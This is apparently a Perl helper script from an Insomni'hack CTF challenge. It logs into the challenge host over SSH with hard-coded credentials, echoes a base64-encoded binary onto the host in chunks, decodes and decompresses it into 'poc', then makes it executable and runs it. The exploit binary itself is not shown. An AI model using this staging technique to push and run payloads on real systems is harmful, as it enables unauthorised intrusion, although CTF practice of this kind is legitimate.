use Net::SSH::Expect;

my $ssh = Net::SSH::Expect->new (
    host => "1118daysober.teaser.insomnihack.ch",
    password=> '1118daysober',
    user => '1118daysober',
    #raw_pty => 1
    no_terminal => 1
);

my $login_output = $ssh->login();
print ($login_output);
sub exec_cmd {
  my $ssh = shift;
  my $cmd = shift;

  $ssh->waitfor("/ \$");
  my $output =  $ssh->exec($cmd);
  sleep(1);
  return $output;
}

print (exec_cmd($ssh,"stty raw -echo;"));
#print (exec_cmd($ssh,"ls -la"));

for (my $i=0; $i <= 100; $i++) {
  my $filename = "code%d";
  my $name = sprintf($filename, $i);

  open(my $fh, '<', $name)
    or die "Could not open file '$name' $!";

my $row = <$fh>;

  chomp $row;
  my $s = "echo -n \"%s\">>/home/user/%s;";
  my $c = sprintf($s, $row, $name);
  my $s1 = "base64 -d /home/user/%s >> /home/user/poc.bz2";
  my $c1 = sprintf($s1, $name);

  print (exec_cmd($ssh, $c));
  print (exec_cmd($ssh, $c1));
  #print (exec_cmd($ssh,"stty raw -echo;"));

  print ("\n$i\n");
}

print ("\n\n\n\n\n\n");
#print (exec_cmd($ssh, "cat /home/user/test"));
print (exec_cmd($ssh, "ls -la"));
print (exec_cmd($ssh, "cd /home/user && bzip2 -d poc.bz2"));
print (exec_cmd($ssh, "cd /home/user && chmod +x poc && ./poc"));

print (exec_cmd($ssh, "ls -la"));

$ssh->close();
